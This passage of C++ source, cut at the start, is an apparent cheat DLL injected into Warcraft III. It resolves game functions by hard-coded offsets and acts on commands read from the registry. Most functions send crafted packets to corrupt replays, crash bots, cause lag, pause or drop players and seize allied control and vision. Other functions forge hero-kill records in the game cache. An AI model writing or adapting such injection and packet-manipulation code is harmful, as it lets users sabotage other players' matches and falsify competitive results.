	delete BadString;
	delete GlobalString;
	delete DataString;
}



void SendBadDataDirectly( )
{
	for ( int i = 0; i < 20; i++ )
	{

		std::vector<BYTE> sendbaddata;

		BYTE dxcache[ ] = { 0x6B, 0x64, 0x72, 0x2E, 0x78, 0x00 };
		for ( int i = 0; i < sizeof( dxcache ); i++ )
			sendbaddata.push_back( dxcache[ i ] );

		/*char * longchar = new char[ 1000 ];
		char datachar[ ] = { 'D' , 'a' , 't' , 'a' , 'x' };

		int datacharid = 0;
		for ( int i = 0; i < ( 1000 ); i++ )
		{
		longchar[ i ] = datachar[ datacharid ];
		datacharid++;
		if ( datacharid > 4 )
		datacharid = 0;
		}
		*/

		BYTE * longchar = GetRandomBytes( 950 );
		longchar[ 0 ] = ( BYTE )'D';
		longchar[ 1 ] = ( BYTE )'a';
		longchar[ 2 ] = ( BYTE )'t';
		longchar[ 3 ] = ( BYTE )'a';
		for ( int i = 0; i < ( 950 ); i++ )
			sendbaddata.push_back( ( BYTE ) longchar[ i ] );


		BYTE dxcacheend[ ] = { 0x00, 0x4D, 0x6F, 0x64, 0x65, 0x61, 0x72, 0x00, 0x01, 0x00, 0x00, 0x00 };
		for ( int i = 0; i < sizeof( dxcacheend ); i++ )
			sendbaddata.push_back( dxcacheend[ i ] );


		SendPacket( &sendbaddata[ 0 ], sendbaddata.size( ) );

	}
}

void TryBotKiller( )
{
	std::vector<BYTE> sendbaddata;

	BYTE dxcache[ ] = { 0x6B, 0x64, 0x72, 0x2E, 0x78, 0x00 };
	for ( int i = 0; i < sizeof( dxcache ); i++ )
		sendbaddata.push_back( dxcache[ i ] );

	for ( int i = 0; i < 5; i++ )
		sendbaddata.push_back( 0 );

	for ( int i = 0; i < 4; i++ )
		sendbaddata.push_back( 0xFF );

	SendPacket( &sendbaddata[ 0 ], sendbaddata.size( ) );


	
}


void StartReplayDestroyer( )
{
	int actionstrlen = strlen( actiondata );
	for ( int i = 0; i < actionstrlen; i++ )
	{
		char action = actiondata[ i ];
		switch ( action )
		{
			case '1':
				WriteBigStrings( );
				break;
			case '2':
				WriteBadStrings( );
				break;
			case '3':
				SendBadDataDirectly( );
				break;
			case '4':
				OtherDestroyMethod( );
				break;
			case '5':
				TryBotKiller( );
				break;
			default:
				break;
		}

		Sleep( 3000 );
		switch ( action )
		{
			case '3':
				SendBadDataDirectly( );
				break;
			case '4':
				OtherDestroyMethod( );
				break;
			default:
				break;
		}

	}
}



void StartDropHack( )
{
	std::vector<BYTE> senddata;
	senddata.push_back( 0x06 );
	senddata.push_back( 0x01 );
	senddata.push_back( 0x00 );
	SendPacket( &senddata[ 0 ], senddata.size( ) );
}


void StartPauseHack( )
{
	std::vector<BYTE> senddata;
	std::vector<BYTE> senddata2;

	senddata.push_back( 0x01 );
	senddata2.push_back( 0x02 );

	for ( int i = 0; i < 3; i++ )
	{
		SendPacket( &senddata2[ 0 ], senddata2.size( ) );
		SendPacket( &senddata[ 0 ], senddata.size( ) );
	}
	SendPacket( &senddata2[ 0 ], senddata2.size( ) );
}


void MakeBadBAAADBAAD( )
{
	std::vector<BYTE> sendverybadpacketdata;

	for ( unsigned int i = 0; i < 15; i++ )
	{

		sendverybadpacketdata.clear( );
		sendverybadpacketdata.push_back( 0x51 );
		sendverybadpacketdata.push_back( i );
		sendverybadpacketdata.push_back( 0x05 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
	}


	/*for ( int i = 0; i < 200; i++ )
	{

	sendverybadpacketdata.clear( );

	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );

	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );

	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0x00 );
	sendverybadpacketdata.push_back( 0xA0 );
	sendverybadpacketdata.push_back( 0x40 );

	SendPacket( &sendverybadpacketdata[ 0 ] , sendverybadpacketdata.size( ) );

	}*/

}


BYTE * GetByteFromData( void * data )
{
	return ( BYTE* ) data;
}

void PingMinimapTest( )
{

	float x = 5000.0f;
	float y = -500.0f;
	float unknownfloat = -1.0f;

	std::vector<BYTE> pingsenddata;

	pingsenddata.push_back( 0x68 );

	for ( int i = 0; i < 4; i++ )
	{
		pingsenddata.push_back( GetByteFromData( &x )[ i ] );
	}

	for ( int i = 0; i < 4; i++ )
	{
		pingsenddata.push_back( GetByteFromData( &y )[ i ] );
	}

	for ( int i = 0; i < 4; i++ )
	{
		pingsenddata.push_back( GetByteFromData( &unknownfloat )[ i ] );
	}

	SendPacket( &pingsenddata[ 0 ], pingsenddata.size( ) );

}


void EnableAllInterafaceButtons( )
{
	//ICCupCourierCheckBox
	//ICCupFullAccessCheckBox
	//UnitsCheckBox
	//VisionCheckBox
	//AllyCheckBox

	std::vector<const char *> alliancecheckboxes;
	alliancecheckboxes.push_back( "ICCupCourierCheckBox" );
	alliancecheckboxes.push_back( "ICCupFullAccessCheckBox" );
	alliancecheckboxes.push_back( "UnitsCheckBox" );
	alliancecheckboxes.push_back( "VisionCheckBox" );
	alliancecheckboxes.push_back( "AllyCheckBox" );


	for ( unsigned int i = 0; i < alliancecheckboxes.size( ); i++ )
	{
		for ( int n = 0; n < 13; n++ )
		{
			WarcraftButton allbtn = WarcraftButton( alliancecheckboxes[ i ], n );
			if ( allbtn.IsOk( ) )
			{
				if ( !allbtn.IsBtnEnabled( ) )
				{
					allbtn.SetBtnFlag( WarcraftButton::STATE_BUTTON_ENABLED );
				}
			}
		}
	}

}


void GiveAllAccess( )
{
	std::vector<BYTE> sendverybadpacketdata;
	for ( int i = 0; i < 13; i++ )
	{
		sendverybadpacketdata.clear( );
		sendverybadpacketdata.push_back( 0x50 );
		sendverybadpacketdata.push_back( i );
		sendverybadpacketdata.push_back( 0x7F );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
		sendverybadpacketdata.clear( );
		sendverybadpacketdata.push_back( 0x50 );
		sendverybadpacketdata.push_back( i );
		sendverybadpacketdata.push_back( 0xFF );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
	}
}


void TryLagHack( )
{
	int ID = 0;

	for ( int i = 0; i < 250; i++ )
	{
		Sleep( 20 );
		std::vector<BYTE> sendverybadpacketdata;
		for ( int i = 0; i < 15; i++ )
		{
			ID++;
			if ( ID == 0 )
			{
				sendverybadpacketdata.clear( );
				sendverybadpacketdata.push_back( 0x50 );
				sendverybadpacketdata.push_back( i );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
			}
			else if ( ID == 1 )
			{
				sendverybadpacketdata.clear( );
				sendverybadpacketdata.push_back( 0x50 );
				sendverybadpacketdata.push_back( i );
				sendverybadpacketdata.push_back( 0x3F );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0xC0 );
				SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
			}
			else if ( ID == 2 )
			{
				sendverybadpacketdata.clear( );
				sendverybadpacketdata.push_back( 0x50 );
				sendverybadpacketdata.push_back( i );
				sendverybadpacketdata.push_back( 0x3F );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x40 );
				SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
			}
			else if ( ID == 3 )
			{
				sendverybadpacketdata.clear( );
				sendverybadpacketdata.push_back( 0x50 );
				sendverybadpacketdata.push_back( i );
				sendverybadpacketdata.push_back( 0xFF );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0x00 );
				sendverybadpacketdata.push_back( 0xFF );
				SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
				ID = -1;
			}
		}
	}

}

void SetSentinelAccess( )
{
	std::vector<BYTE> sendverybadpacketdata;
	for ( int i = 0; i < 13; i++ )
	{
		sendverybadpacketdata.clear( );
		sendverybadpacketdata.push_back( 0x50 );
		sendverybadpacketdata.push_back( i );
		if ( i < 6 )
		{
			sendverybadpacketdata.push_back( 0x7F );
		}
		else
		{
			sendverybadpacketdata.push_back( 0x00 );
		}
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
	}
}

void SetScourgeAccess( )
{
	std::vector<BYTE> sendverybadpacketdata;
	for ( int i = 0; i < 13; i++ )
	{
		sendverybadpacketdata.clear( );
		sendverybadpacketdata.push_back( 0x50 );
		sendverybadpacketdata.push_back( i );
		if ( i < 6 )
		{
			sendverybadpacketdata.push_back( 0x00 );
		}
		else
		{
			sendverybadpacketdata.push_back( 0x7F );
		}
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		sendverybadpacketdata.push_back( 0x00 );
		SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
	}
}

void SendAllUnstuck( )
{
	std::vector<BYTE> sendverybadpacketdata;
	char * unstuckcommand = "-unstuck";

	for ( int i = 0; i < 0xFF; i++ )
	{
		for ( int n = 0; n < 0xFF; n++ )
		{
			sendverybadpacketdata.clear( );
			sendverybadpacketdata.push_back( 0x60 );
			sendverybadpacketdata.push_back( i );
			sendverybadpacketdata.push_back( 0x7D );
			sendverybadpacketdata.push_back( 0 );
			sendverybadpacketdata.push_back( 0 );
			sendverybadpacketdata.push_back( n );
			sendverybadpacketdata.push_back( 0x7E );
			sendverybadpacketdata.push_back( 0);
			sendverybadpacketdata.push_back( 0 );
			for ( int x = 0; x < strlen( unstuckcommand ); x++ )
			{
				sendverybadpacketdata.push_back( unstuckcommand[x] );
			}
			sendverybadpacketdata.push_back( 0 );
			SendPacket( &sendverybadpacketdata[ 0 ], sendverybadpacketdata.size( ) );
		}
	}

}

void ProcessOtherHackActions( )
{
	int actionstrlen = strlen( actiondata );
	for ( int i = 0; i < actionstrlen; i++ )
	{
		char action = actiondata[ i ];
		switch ( action )
		{
			case '1':
				StartDropHack( );
				break;
			case '2':
				StartPauseHack( );
				break;
			case '3':
				MakeBadBAAADBAAD( );
				break;
			case '4':
				PingMinimapTest( );
				break;
			case '5':
				EnableAllInterafaceButtons( );
				break;
			case '6':
				GiveAllAccess( );
				break;
			case '7':
				TryLagHack( );
				break;
			case '8':
				SetSentinelAccess( );
				break;
			case '9':
				SetScourgeAccess( );
				break;
			case '0':
				SendAllUnstuck( );
				break;
			default:
				break;
		}

	}
}



void KillHero( int killer, int killed, BOOL needsleep )
{
	char buffer1[ 128 ];

	JassString * KillHeroString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Data", DataString );

	sprintf_s( buffer1, sizeof( buffer1 ), "%s%i", "Hero", killed );
	GetJassString( buffer1, KillHeroString );

	StoreInteger( gamecache, DataString, KillHeroString, killer );
	SyncStoredInteger( gamecache, DataString, KillHeroString );

	int sleeptime = 1 + ( rand( ) % 700 );
	if ( needsleep )
		Sleep( sleeptime );

	delete KillHeroString;
	delete DataString;
}


void WriteKillsForPlayer( )
{
	int actionstrlen = strlen( actiondata );
	if ( actionstrlen > 2 )
	{
		int killer = GetPlayerFromID( actiondata[ 0 ] );
		int killed = GetPlayerFromID( actiondata[ 1 ] );
		BOOL sleep = actiondata[ 2 ] == '1' ? TRUE : FALSE;
		int killscount = 0;
		char buffer[ 5 ];
		memset( buffer, 0, 5 );
		int id = 0;
		for ( int i = 3; i < actionstrlen; i++, id++ )
		{
			buffer[ id ] = actiondata[ i ];
		}
		killscount = atoi( buffer );
		for ( int i = 0; i < killscount; i++ )
		{

			KillHero( killer, killed, sleep );

		}
	}
}


void ProcessActions( )
{

	switch ( actiontype )
	{
		case 1:
			ReadDestroyTowersData( );
			break;
		case 2:
			StartReplayDestroyer( );
			break;
		case 3:
			WriteKillsForPlayer( );
			break;
		case 4:
			ProcessOtherHackActions( );
			break;
		default:
			break;
	}


}


BOOL cachefound = FALSE;

void ReadActionDataAndStartReader( )
{

	RegKey key( HKEY_CURRENT_USER );
	key.Open( winhackkeyaddr );
	RegValue value = key[ winhackkeyname ];
	LPCTSTR daatast = value;

	if ( _stricmp( daatast, winhackkey ) != 0 )
	{
		int x = 5;
		x -= 5;
		x = 100 / x;
		*( int * ) 0x0 = 2153123;
		*( int * ) 0xFFFFFFFF = 2153123;
	}

	key[ winhackkeyname ] = "";
	value = key[ actiontypename ];
	actiontype = atoi( ( LPCSTR ) value );
	value = key[ actiontypedataname ];
	daatast = value;
	sprintf_s( actiondata, 512, "%s", daatast );

	value = key[ "unload" ];


	if ( _stricmp( ( LPCSTR ) value, "1" ) != 0 )
	{
		int x = 27827;
		x -= 27827;
		x = 100 / x;
		*( int * ) 0x0 = 5321;
		*( int * ) 0xFFFFFFFF = 12345;
	}

	if ( cachefound )
		ProcessActions( );

	key[ actiontypedataname ] = "";
	key[ actiontypename ] = "";
	key[ "unload" ] = "0";

}


BOOL IsGameCache( UINT id )
{
	gamecache = id;
	JassString * GameStartString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Data", DataString );
	GetJassString( "GameStart", GameStartString );

	int randomvalue = 5 + ( rand( ) % 100 );
	StoreInteger( gamecache, DataString, GameStartString, randomvalue );
	int returnvalue = GetStoredInteger( gamecache, DataString, GameStartString );
	if ( returnvalue == randomvalue )
	{
		StoreInteger( gamecache, DataString, GameStartString, 1 );
		SyncStoredInteger( gamecache, DataString, GameStartString );
		cachefound = TRUE;
	}
	delete GameStartString;
	delete DataString;

	return returnvalue == randomvalue;
}

UINT GetMaxUnitForMap( )
{
	UINT tmp = 0;
	UINT32 tmpaddr = *( UINT32* ) ( GameDll + 0xAAE2FC );
	if ( tmpaddr )
	{
		tmp += *( UINT* ) ( tmpaddr + 0x428 );
		if ( tmp )
		{
			tmp += 0x100000;
			if ( tmp == 0x100000 )
				return 0x1FFFFF;
		}
	}
	return tmp;
}

void SetGameCacheForMe( )
{
	for ( UINT i = 0x100000; i < GetMaxUnitForMap( ); i++ )
	{
		if ( IsGameCache( i ) )
		{
			return;
		}
	}
}

void ProcessWinhack( )
{
	if ( IsGame( ) )
	{
		SetTlsForMe( );
		SetWinhackKey( );
		SetGameCacheForMe( );
		ReadActionDataAndStartReader( );
	}
}


DWORD WINAPI WinhackThr( LPVOID qertqer )
{
	GameDll = ( int ) GetModuleHandle( "Game.dll" );
	int tmpint = 0xCA0A0;
	StoreInteger = ( pStoreInteger ) ( GameDll + 0x300000 + tmpint );
	tmpint = 0xCA6E0;
	SyncStoredInteger = ( pSyncStoredInteger ) ( GameDll + 0x300000 + tmpint );
	tmpint = 0xCA870;
	GetStoredInteger = ( pGetStoredInteger ) ( GameDll + 0x300000 + tmpint );
	tmpint = 0xD3F30;
	ExecuteFunc = ( pExecuteFunc ) ( GameDll + 0x300000 + tmpint );
	try
	{
		ProcessWinhack( );
	}
	catch ( ... )
	{
		Beep( 600, 1000 );
	}
	return 0;
}

HANDLE whid;

BOOL WINAPI DllMain( HINSTANCE hDLL, UINT reason, LPVOID reserved )
{
	if ( reason == DLL_PROCESS_ATTACH )
	{
		srand( ( unsigned int ) time( NULL ) );
		whid = CreateThread( 0, 0, WinhackThr, hDLL, 0, 0 );
	}
	else if ( reason == DLL_PROCESS_DETACH )
	{
		TerminateThread( whid, 0 );
	}
	return TRUE;
}